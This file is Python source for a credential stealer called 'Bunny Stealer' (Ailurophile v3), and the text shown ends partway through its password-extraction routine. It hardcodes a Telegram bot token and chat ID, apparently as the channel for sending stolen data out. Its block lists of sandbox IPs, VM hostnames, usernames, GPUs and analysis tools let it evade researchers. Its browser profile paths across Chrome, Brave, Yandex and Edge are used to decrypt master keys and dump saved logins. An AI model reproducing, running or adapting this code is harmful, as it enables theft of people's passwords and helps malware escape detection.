#Ailurophile Stealer Version 3 - Python - Bunny Stealer

import base64
import datetime
import glob
import hmac
import io
import json
import os
import re
import shutil
import sqlite3
import random
import tempfile
import subprocess
import time
import urllib.request
import zipfile
import socket
import sys
from multiprocessing import Process
from requests.cookies import RequestsCookieJar
from base64 import b64decode
from ctypes import byref, pointer, WINFUNCTYPE, windll, create_unicode_buffer
from ctypes.wintypes import DWORD, UINT, WCHAR
from hashlib import pbkdf2_hmac, sha1
from pathlib import Path
import requests
from Crypto.Cipher import AES, DES3
from pyasn1.codec.der.decoder import decode
from websocket import create_connection
from win32crypt import CryptUnprotectData

Telegram_token = "7743229186:AAELnA8JMi-W8-SYTO5BDiZT4r_JC8WQi3o"
Telegram_chat_id = "6871070750"
#Thông tin có thể chỉnh sửa được
blackListedIPS = [
    "181.214.153.11", "181.214.153.11", "169.150.197.118", "88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69", "194.154.78.137",
    "213.33.190.219", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222",
    "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169",
    "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91",
    "34.105.72.241", "109.74.154.92", "213.33.142.50", "88.132.231.71", "95.25.204.90", "34.105.72.241", "193.128.114.45", "78.139.8.50", "34.145.89.174",
    "109.74.154.92", "95.25.81.24", "20.99.160.173", "109.74.154.90", "213.33.142.50", "92.211.52.62", "88.153.199.169", "109.145.173.169", "109.74.154.91",
    "88.132.227.238", "84.147.62.12", "34.141.146.114", "93.216.75.209", "35.199.6.13", "194.154.78.160", "212.119.227.151", "192.87.28.103", "80.211.0.97",
    "92.211.109.160", "195.239.51.59", "88.132.226.203", "34.85.253.170", "195.74.76.222", "192.40.57.234", "195.181.175.105", "23.128.248.46", "188.105.91.116",
    "64.124.12.162", "88.132.225.100", "35.229.69.227", "34.105.183.68", "34.142.74.220", "92.211.192.144", "34.138.96.23", "92.211.55.199", "188.105.91.173",
    "34.83.46.130", "192.211.110.74", "79.104.209.33", "109.74.154.91", "188.105.91.143", "35.237.47.12", "178.239.165.70", "34.141.245.25", "34.85.243.241",
    "87.166.50.213", "34.105.0.27", "34.145.195.58", "193.225.193.201", "34.253.248.228", "35.192.93.107", "195.239.51.3", "84.147.54.113", "212.119.227.167",
]
blackListedHostname = [
    "BEE7370C-8C0C-4", "AppOnFly-VPS", "tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",
    "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET",
    "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
    "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH"
]

blackListedUsername = [
    "WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY",
    "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A",
    "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl"
]
blackListedGPU = [
    "Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter",
    "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter",
    "K9SC88UK", "Стандартный VGA графический адаптер"
]
blacklistedOS = [
    "Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter",
    "Windows Server 2016 Standard", "Windows Server 2016 Datacenter"
]
blackListedProcesses = [
    "watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe", "Charles.exe", "Postman.exe",
    "BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "Fiddler.WebUi.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe",
    "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe", "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe",
    "Fiddler.exe", "KsDumperClient.exe", "KsDumper.exe", "FolderChangesView.exe", "BinaryNinja.exe", "Cheat Engine 6.8.exe",
    "Cheat Engine 6.9.exe", "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe", "OllyDbg.exe", "Wireshark.exe",
    "httpdebuggerui.exe","vmwareuser.exe","wireshark.exe","vgauthservice.exe","fiddler.exe","vmacthlp.exe","regedit.exe","x96dbg.exe",
    "cmd.exe","vmsrvc.exe","taskmgr.exe","x32dbg.exe","vboxservice.exe","vmusrvc.exe","df5serv.exe","prl_cc.exe","processhacker.exe",
    "prl_tools.exe","vboxtray.exe","xenservice.exe","vmtoolsd.exe","qemu-ga.exe","vmwaretray.exe","joeboxcontrol.exe","ida64.exe",
    "ksdumperclient.exe","ollydbg.exe","ksdumper.exe","pestudio.exe","joeboxserver.exe"
]

Chromium_Base = [
    # Google Chrome
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default",
        "profile_name": "Default",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 1",
        "profile_name": "Profile 1",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 2",
        "profile_name": "Profile 2",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 3",
        "profile_name": "Profile 3",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 4",
        "profile_name": "Profile 4",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 5",
        "profile_name": "Profile 5",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 6",
        "profile_name": "Profile 6",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 7",
        "profile_name": "Profile 7",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 8",
        "profile_name": "Profile 8",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 9",
        "profile_name": "Profile 9",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 10",
        "profile_name": "Profile 10",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 11",
        "profile_name": "Profile 11",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 12",
        "profile_name": "Profile 12",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 13",
        "profile_name": "Profile 13",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 14",
        "profile_name": "Profile 14",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 15",
        "profile_name": "Profile 15",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 16",
        "profile_name": "Profile 16",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 17",
        "profile_name": "Profile 17",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 18",
        "profile_name": "Profile 18",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 19",
        "profile_name": "Profile 19",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Profile 20",
        "profile_name": "Profile 20",
        "root_path": Path("C:/Program Files/Google/Chrome/Application/chrome.exe")
    },

    # Brave Browser
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
        "profile_name": "Default",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 1",
        "profile_name": "Profile 1",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 2",
        "profile_name": "Profile 2",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 3",
        "profile_name": "Profile 3",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 4",
        "profile_name": "Profile 4",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 5",
        "profile_name": "Profile 5",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 6",
        "profile_name": "Profile 6",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 7",
        "profile_name": "Profile 7",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 8",
        "profile_name": "Profile 8",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 9",
        "profile_name": "Profile 9",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 10",
        "profile_name": "Profile 10",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 11",
        "profile_name": "Profile 11",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 12",
        "profile_name": "Profile 12",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 13",
        "profile_name": "Profile 13",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 14",
        "profile_name": "Profile 14",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 15",
        "profile_name": "Profile 15",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 16",
        "profile_name": "Profile 16",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 17",
        "profile_name": "Profile 17",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 18",
        "profile_name": "Profile 18",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 19",
        "profile_name": "Profile 19",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Profile 20",
        "profile_name": "Profile 20",
        "root_path": Path("C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe")
    },

    # Yandex Browser
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Default",
        "profile_name": "Default",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 1",
        "profile_name": "Profile 1",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 2",
        "profile_name": "Profile 2",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 3",
        "profile_name": "Profile 3",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 4",
        "profile_name": "Profile 4",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 5",
        "profile_name": "Profile 5",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 6",
        "profile_name": "Profile 6",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 7",
        "profile_name": "Profile 7",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 8",
        "profile_name": "Profile 8",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 9",
        "profile_name": "Profile 9",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 10",
        "profile_name": "Profile 10",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 11",
        "profile_name": "Profile 11",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 12",
        "profile_name": "Profile 12",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 13",
        "profile_name": "Profile 13",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 14",
        "profile_name": "Profile 14",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 15",
        "profile_name": "Profile 15",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 16",
        "profile_name": "Profile 16",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 17",
        "profile_name": "Profile 17",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 18",
        "profile_name": "Profile 18",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 19",
        "profile_name": "Profile 19",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Profile 20",
        "profile_name": "Profile 20",
        "root_path": Path("C:/Program Files/Yandex/YandexBrowser/Application/browser.exe")
    },

    # Microsoft Edge
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Default",
        "profile_name": "Default",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 1",
        "profile_name": "Profile 1",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 2",
        "profile_name": "Profile 2",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 3",
        "profile_name": "Profile 3",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 4",
        "profile_name": "Profile 4",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 5",
        "profile_name": "Profile 5",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 6",
        "profile_name": "Profile 6",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 7",
        "profile_name": "Profile 7",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 8",
        "profile_name": "Profile 8",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 9",
        "profile_name": "Profile 9",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 10",
        "profile_name": "Profile 10",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 11",
        "profile_name": "Profile 11",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 12",
        "profile_name": "Profile 12",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 13",
        "profile_name": "Profile 13",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 14",
        "profile_name": "Profile 14",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 15",
        "profile_name": "Profile 15",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 16",
        "profile_name": "Profile 16",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 17",
        "profile_name": "Profile 17",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 18",
        "profile_name": "Profile 18",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 19",
        "profile_name": "Profile 19",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    },
    {
        "profile_path": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Profile 20",
        "profile_name": "Profile 20",
        "root_path": Path("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    }
]

#Các function
def get_ip():
    try:
        response = requests.get("https://api.myip.com")
        response.raise_for_status()
        result = response.json()
        ip = result.get("ip", "Unknown IP")
        cc = result.get("cc", "Unknown CC")
    except requests.RequestException as err:
        ip, cc = "Unknown IP", "Unknown CC"
    except json.JSONDecodeError as err:
        ip, cc = "Unknown IP", "Unknown CC"
    return f"[{ip}][{cc}]"
def check_ip_blacklist(ip):
    if ip in blackListedIPS:
        sys.exit(1)
def check_hostname_blacklist():
    hostname = socket.gethostname()
    if hostname in blackListedHostname:
        sys.exit(1)
def check_username_blacklist():
    username = os.getlogin()
    if username in blackListedUsername:
        sys.exit(1)
def check_gpu_blacklist(WorkPath):
    try:
        output_file = WorkPath / "Info.txt"
        subprocess.check_output(f"dxdiag /t {output_file}", shell=True).decode('utf-8')
        with open(output_file, "r") as file:
            data = file.read()
            for gpu in blackListedGPU:
                if gpu in data:
                    pass
                    #sys.exit(1)
    except Exception:
        pass
def check_os_blacklist():
    try:
        os_info = f"{platform.system()} {platform.release()}"
        if os_info in blacklistedOS:
            sys.exit(1)
    except Exception:
        pass
def check_process_blacklist():
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                process_name = proc.info['name']
                if process_name in blackListedProcesses:
                    sys.exit(1)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
    except Exception:
        pass

WorkPath = Path(os.getenv("LOCALAPPDATA")) / "Bunny"
if not WorkPath.exists():
    WorkPath.mkdir(parents=True, exist_ok=True)
WorkTime = datetime.datetime.now().strftime("%H-%M-%S-%d-%m-%y")
ip_info = get_ip()
WorkName = ip_info + WorkTime
ip = ip_info.split(']')[0][1:]
check_ip_blacklist(ip)
check_hostname_blacklist()
check_username_blacklist()
check_gpu_blacklist(WorkPath)
check_os_blacklist()
check_process_blacklist()

def check_chromium_paths():
    existing_paths = []
    for browser_info in Chromium_Base:
        if browser_info["profile_path"].exists() and browser_info["root_path"].exists():
            existing_paths.append(browser_info)
    return existing_paths
existing_chromium_paths = check_chromium_paths()
def get_encrypted(chromium_paths):
    for browser_info in chromium_paths:
        profile_path = browser_info["profile_path"]
        local_state_path = profile_path.parent / "Local State" 
        if not local_state_path.exists():
            continue
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                c = f.read()
        except FileNotFoundError:
            continue
        if 'os_crypt' not in c:
            continue
        try:
            local_state = json.loads(c)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            if isinstance(decrypted_key, bytes):
                decrypted_key = decrypted_key.hex()
            browser_info["decrypted_key"] = decrypted_key
        except Exception as e:
            pass
get_encrypted(existing_chromium_paths)
def get_passwords(chromium_paths, WorkPath):
    total_passwords = 0
    def copy_file(src, dst):
        try:
            shutil.copy2(src, dst)
        except Exception as e:
            return False
        return True
    for browser_info in chromium_paths:
        profile_path = browser_info["profile_path"]
        profile_name = browser_info["profile_name"]
        root_path = browser_info["root_path"]
        decrypted_key = browser_info.get("decrypted_key", None)
        browser_name = root_path.stem.replace(".exe", "").replace("_", " ").title()
        if not profile_path.exists():
            continue
        login_data_path = profile_path / "Login Data"
        passwords_db_path = profile_path / "passwords.db"
        if not login_data_path.exists():
            continue
        if not copy_file(login_data_path, passwords_db_path):
            continue
        try:
            conn = sqlite3.connect(passwords_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
            rows = cursor.fetchall()
        except Exception as e:
            continue
        passwords = []
        for row in rows:
            origin_url, username_value, password_value, date_created = row
            if not username_value or len(password_value) < 31:
                continue
